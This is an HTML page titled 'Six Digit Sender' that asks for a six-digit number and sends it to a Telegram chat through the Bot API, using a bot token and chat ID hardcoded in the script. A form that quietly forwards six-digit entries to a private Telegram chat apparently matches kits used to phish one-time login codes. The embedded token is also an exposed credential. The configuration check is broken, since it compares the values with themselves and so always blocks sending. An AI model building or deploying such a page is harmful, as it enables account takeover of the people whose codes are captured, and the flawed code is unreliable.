
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Six Digit Sender</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #101828, #243b55);
      padding: 20px;
    }

    .card {
      width: 100%;
      max-width: 380px;
      background: #ffffff;
      padding: 30px 24px;
      border-radius: 18px;
      box-shadow: 0 15px 40px #0004;
      text-align: center;
    }

    .logo {
      width: 60px;
      height: 60px;
      display: grid;
      place-items: center;
      margin: 0 auto 18px;
      border-radius: 50%;
      background: #e0f2fe;
      font-size: 28px;
    }

    h2 {
      margin: 0 0 10px;
      color: #172033;
    }

    p {
      color: #667085;
      font-size: 14px;
      line-height: 1.5;
    }

    input {
      width: 100%;
      margin-top: 16px;
      padding: 15px 10px;
      border: 1px solid #d0d5dd;
      border-radius: 10px;
      outline: none;
      text-align: center;
      font-size: 25px;
      letter-spacing: 9px;
    }

    input:focus {
      border-color: #229ed9;
      box-shadow: 0 0 0 3px #229ed922;
    }

    button {
      width: 100%;
      margin-top: 18px;
      padding: 14px;
      background: #229ed9;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    #status {
      min-height: 22px;
      margin-top: 16px;
      font-size: 14px;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #98a2b3;
    }
  </style>
</head>

<body>
  <main class="card">
    <div class="logo">📩</div>

    <h2>Six Digit Sender</h2>
    <p>Enter six digits and submit them.</p>

    <form id="numberForm">
      <input
        type="text"
        id="digits"
        placeholder="••••••"
        maxlength="6"
        minlength="6"
        inputmode="numeric"
        pattern="[0-9]{6}"
        autocomplete="off"
        aria-label="Six-digit number"
        required
      >

      <button type="submit" id="submitBtn">
        Submit
      </button>
    </form>

    <div id="status" role="status" aria-live="polite"></div>

    <div class="footer">Six Digit Sender</div>
  </main>

  <script>
    // Enter your Telegram bot details here.
    const BOT_TOKEN = "8882512901:AAELOm0vWyxR9OC03g8_ZgJrPfPTHGIayRE";
    const CHAT_ID = "7479503756";

    const form = document.getElementById("numberForm");
    const digitsInput = document.getElementById("digits");
    const submitBtn = document.getElementById("submitBtn");
    const status = document.getElementById("status");

    digitsInput.addEventListener("input", () => {
      digitsInput.value = digitsInput.value
        .replace(/\D/g, "")
        .slice(0, 6);
    });

    form.addEventListener("submit", async (event) => {
      event.preventDefault();

      const digits = digitsInput.value;

      if (!/^\d{6}$/.test(digits)) {
        status.textContent = "Please enter exactly six digits.";
        status.style.color = "#d92d20";
        return;
      }

      if (
        BOT_TOKEN === "8882512901:AAELOm0vWyxR9OC03g8_ZgJrPfPTHGIayRE" ||
        CHAT_ID === "7479503756"
      ) {
        status.textContent = "Configure your bot token and chat ID first.";
        status.style.color = "#d92d20";
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = "Sending...";
      status.textContent = "";

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: `Six-digit submission: ${digits}`
            })
          }
        );

        const result = await response.json();

        if (!response.ok || !result.ok) {
          throw new Error("Telegram rejected the request.");
        }

        status.textContent = "Sent successfully!";
        status.style.color = "#039855";
        form.reset();

      } catch (error) {
        status.textContent =
          "Unable to send. Check your bot details and connection.";
        status.style.color = "#d92d20";
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = "Submit";
      }
    });
  </script>
</body>
</html>
